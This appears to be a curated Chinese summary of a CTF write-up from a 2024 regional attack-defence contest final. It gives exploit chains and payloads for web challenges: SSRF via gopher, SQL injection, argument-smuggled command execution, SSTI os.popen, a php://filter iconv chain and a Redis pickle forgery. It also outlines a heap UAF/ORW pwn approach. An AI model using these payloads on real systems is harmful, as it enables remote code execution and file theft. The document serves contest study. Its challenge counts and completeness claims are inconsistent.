---
title: 第二届黄河流域网络攻防竞赛决赛WriteUp分享
contest: 黄河流域网络攻防竞赛决赛
year: 2024
difficulty: medium
vuln_type: web_unknown
tags: [AWDP赛制,Web-SSRF,Gopher,SQL注入,RCE,Flask,SSTI,SSTI-WAF绕,PHP反序列化,Pickle,Redis,响应包,Sign越权,php://filter,反序列化,Pwn-ORW,Pwn-UAF]
attack_chain: sitemap: SSRF(getPageInfoFromUrl)+SQL注入(batchDelete)→UPDATE pages SET url=gopher+302跳转(click)→打ApiContronller.php/backup exec→unzip-command参数RCE|简单的渗透: Flask Login类爆破password+admin header admingivemeflag+eval RCE|重生之我要上清华北大: 抓包修改注册时间绕过+sign md5签名算法控制role+php://filter charset爆破+include读取|重生之我要当最强管理员: 任意文件读取+Redis RESP协议pickle序列化+SSTI description字段RCE|account: tcache_struct+environ泄露栈+ORW_rop|alarm/fmt/just_a_heap
key_payload: gopher://127.0.0.1:80/_POST%20/api.php%3Faction%3Dbackup%20HTTP/1.1...%7B%22path%22%3A%22%20-T%20--unzip-command%3D%27sh%20-c%20cat%3C/flag%7Ctee%3Eflag%27%22%7D|admingivemeflag{os.popen("cat /flag").read()}|http://IP/admin.php?file=php://filter/convert.iconv.UTF8.CSISO2022KR|...|序列化Redis SET user:xxxxxxxxxx base64(pickle.dumps({'passw0rd':'expexp','r0le':'adm1n'}))
one_liner: AWDP赛制7题(WEB×4+PWN×3),核心链为SSRF+gopher+SQL注入+302跳转三层跳板打backup exec实现RCE,Flask密码爆破+SSTI,sign签名md5算法控制role+php://filter iconv爆破,Redis RESP+Pickle+SSTI三件套
lesson: 1) SSRF打本机需绕gopher协议黑名单→SQL注入写入DB→click() 302跳板链; 2) Flask password短比较+结果可爆破(62^36空间过大但results[0:short]逐位可爆); 3) sign签名要包含role字段,可逆向JS或动态生成伪造admin; 4) php://filter convert.iconv串可逐层降维/升维清空字符,UTF8→CSISO2022KR是经典起手式; 5) 任意文件读取+Redis RESP+Pickle组合:SSTI通过模板author字段触发__globals__.__builtins__.__import__('os').popen; 6) 禁用execve的PWN用environ泄露栈地址+改返回地址为orw_rop
quality: high
---

## 备注

AWDP(AWD Plus)赛制,攻防一体。WEB题4道,PWN题3道。

### WEB详细技术

**1) sitemap** — 三跳链SSRF
- Apicontronller.php::backup() exec(命令),checkAuth()限制127.0.0.1
- Pagetroller.php::getPageInfoFromUrl() SSRF,但过滤gopher://协议
- Pagetroller.php::click() 302跳转,url从DB读,不受过滤
- Apicontronller.php::batchDelete() SQL注入,GET传ids
- 链路:SSRF→batchDelete注入→UPDATE pages SET url=gopher://→click() 302跳到ApiContronller.php→backup() exec
- 关键payload:`-T --unzip-command='sh -c cat</flag|tee>flag'`作为path参数

**2) 简单的渗透** — Flask密码爆破+SSTI
- `/login?password=`短比较results[0:short]逐位可爆(62字符集)
- `/check?username=&hostname=127.0.0.1`触发eval
- header: `username:admingivemeflag{os.popen("cat /flag").read()}`

**3) 重生之我要上清华北大** — 多漏洞链
- 注册页disable前端绕过+抓包修改时间戳
- sign签名md5(birthdate+college+id_number+major+name+role+timestamp),需带role字段,改role=2为admin
- admin.php?file=php://filter convert.iconv链(UTF8→CSISO2022KR→base64-encode→...)绕过info开头+txt后缀+黑名单(php/input/base64/../)
- include读取flag

**4) 重生之我要当最强管理员** — 任意文件读取+Redis+Pickle+SSTI
- /view_book?filename=app.py 任意文件读
- Redis RESP协议pack_command('SET', user:random_str, base64(pickle.dumps({'passw0rd':'expexp','r0le':'adm1n'})))
- /add_book description字段SSTI:`{{application.__init__.__globals__.__builtins__['__import__']('os').popen('cat /flag').read()}}`
- 模板渲染触发RCE

### PWN详细技术

**1) account** — libc 2.31,ORW
- 堆地址程序给出+unsorted bin切割泄libc
- 4选项remove触发free,add后不edit直接remove触发UAF,可改fd
- 思路:控制tcache_struct→environ泄栈→改返回地址为orw_rop
- execve被seccomp禁,走orw路线
- libc偏移:leak - 0x3C3B78

**2/3/4) alarm / fmt / just_a_heap** — 题目名提及,具体exp未给完整(正文被截断到offset 190)

## 评级

- **quality: high** — WEB 4道全链清晰,payload完整,可直接复现;PWN account完整exp齐,其他3题只给思路
- **vuln_type: web_unknown** — AWDP混合赛,主分类Web;实际涉及ssrf、sqli、ssti、deserialize、rce
- 经验复用价值:SSRF+302跳板绕gopher黑名单是经典AWDP套路
